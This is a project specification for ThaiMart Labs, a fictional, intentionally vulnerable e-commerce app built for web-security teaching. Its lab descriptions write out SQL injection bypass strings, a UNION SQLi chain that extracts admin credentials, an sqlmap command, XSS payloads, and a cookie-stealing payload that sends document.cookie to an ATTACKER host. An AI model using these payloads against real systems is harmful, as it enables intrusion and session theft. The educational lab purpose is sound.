# ThaiMart Labs - Project Specification

## Overview

**ThaiMart** is a fictional Thai e-commerce platform used as the theme for cybersecurity education labs. Students practice web security concepts in a realistic environment.

**Slogan:** ช้อปสนุก ส่งไว ทั่วไทย

## Tech Stack

| Component | Technology |
|-----------|------------|
| Runtime | Node.js 20 |
| Framework | Express 4 |
| Database | PostgreSQL 16 |
| Templates | EJS |
| Container | Docker Compose |

## Color Scheme

```css
:root {
  --primary: #f97316;      /* Orange - ThaiMart brand */
  --primary-dark: #c2410c;
  --secondary: #1e3a5f;    /* Navy */
  --background: #f8fafc;
  --text-dark: #1a1a1a;
  --text-muted: #6b7280;
  --border: #e5e7eb;
  --success: #16a34a;
  --danger: #dc2626;
}
```

## Project Structure

```
ThaiMart-Labs/
├── CLAUDE.md               # This file
├── README.md               # Setup instructions
├── docker-compose.yml      # Docker orchestration
├── Dockerfile              # Node.js image
├── package.json            # Dependencies
├── .gitignore
├── .env.example
│
├── src/
│   ├── app.js              # Express entry point
│   │
│   ├── routes/
│   │   ├── index.js        # Hub page
│   │   ├── lab01.js        # HTTP Methods
│   │   ├── lab02.js        # Stateless Demo
│   │   ├── lab03.js        # SQL Playground
│   │   ├── lab04.js        # Auth Bypass (SQLi)
│   │   ├── lab05.js        # Union SQLi
│   │   ├── lab06.js        # SQLmap Target
│   │   ├── lab07.js        # Reflected XSS
│   │   ├── lab08.js        # Cookie Stealing
│   │   ├── lab09.js        # Stored XSS
│   │   └── logger.js       # Cookie catcher
│   │
│   ├── views/
│   │   ├── layout.ejs
│   │   ├── hub.ejs
│   │   ├── 404.ejs
│   │   ├── error.ejs
│   │   └── labs/
│   │       ├── lab01.ejs
│   │       ├── lab02-*.ejs
│   │       ├── lab03.ejs
│   │       ├── lab04-*.ejs
│   │       ├── lab05.ejs
│   │       ├── lab06.ejs
│   │       ├── lab07.ejs
│   │       ├── lab08-*.ejs
│   │       ├── lab09.ejs
│   │       └── logger.ejs
│   │
│   └── public/
│       ├── css/style.css
│       └── js/main.js
│
└── database/
    └── init.sql            # Schema + seed data
```

## Labs Detail

### Lab 01: HTTP Methods
- **Path:** `/lab01`
- **Story:** ThaiMart Developer Portal - API Tester
- **Concept:** GET, POST, PUT, DELETE methods
- **Vulnerable:** No

### Lab 02: Stateless Demo
- **Path:** `/lab02`
- **Story:** ThaiMart Member Login
- **Credentials:** user1 / password123
- **Concept:** Cookies, session, stateless HTTP
- **Vulnerable:** No

### Lab 03: SQL Playground
- **Path:** `/lab03`
- **Story:** Employee DB Explorer (Internal)
- **Concept:** SQL commands (SELECT, INSERT, UPDATE, DELETE)
- **Vulnerable:** No (educational only)

### Lab 04: Auth Bypass
- **Path:** `/lab04`
- **Story:** ThaiMart Seller Portal
- **Credentials:** seller1 / securepass99
- **Vulnerable:** YES - SQL Injection
- **Attack:** `' OR '1'='1` or `admin'--`

### Lab 05: Union-Based SQLi
- **Path:** `/lab05`
- **Story:** Staff Directory Search
- **Vulnerable:** YES - Union SQL Injection
- **Attack Path:**
  1. `' ORDER BY 4--` (find columns)
  2. `' UNION SELECT 1,2,3,4--` (display columns)
  3. `' UNION SELECT 1,version(),3,4--` (DB version)
  4. `' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--`
  5. `' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'--`
  6. `' UNION SELECT 1,username,password_hash,role FROM admin_credentials--`
- **Hidden Data:** admin_credentials table with superadmin account

### Lab 06: SQLmap Target
- **Path:** `/lab06?id=1`
- **Story:** Product Category Page
- **Vulnerable:** YES - Numeric SQL Injection
- **Attack:** `sqlmap -u "http://TARGET/lab06?id=1" --dbs`
- **Hidden Data:** secret_orders table with fake credit cards

### Lab 07: Reflected XSS
- **Path:** `/lab07`
- **Story:** Product Search
- **Vulnerable:** YES - Reflected XSS
- **Attack:** `<script>alert(1)</script>`

### Lab 08: Cookie Stealing
- **Path:** `/lab08`
- **Story:** Member Search
- **Credentials:** member1 / 1234
- **Vulnerable:** YES - Reflected XSS + Cookie Theft
- **Attack:** `<img src=x onerror="fetch('http://ATTACKER/logger/catch?c='+document.cookie)">`

### Lab 09: Stored XSS
- **Path:** `/lab09`
- **Story:** Product Reviews
- **Vulnerable:** YES - Stored XSS
- **Attack:** Submit review with `<script>alert('XSS')</script>`

### Logger (Cookie Catcher)
- **Path:** `/logger`
- **Endpoint:** `GET /logger/catch?c=COOKIE`
- **Purpose:** Students' attacker server for XSS labs

## Database Tables

- `playground_products` - Lab 03
- `seller_accounts` - Lab 04
- `staff` - Lab 05
- `admin_credentials` - Lab 05 (secret)
- `categories` - Lab 06
- `category_products` - Lab 06
- `secret_orders` - Lab 06 (secret)
- `search_products` - Lab 07
- `reviews` - Lab 09

## Commands

```bash
# Development
docker-compose up -d
docker-compose logs -f web

# Reset database
docker-compose down -v && docker-compose up -d

# Rebuild
docker-compose up -d --build
```

## Security Notes

**INTENTIONALLY VULNERABLE - EDUCATIONAL USE ONLY**

- Deploy only on isolated networks
- Never use in production
- Teach responsible disclosure
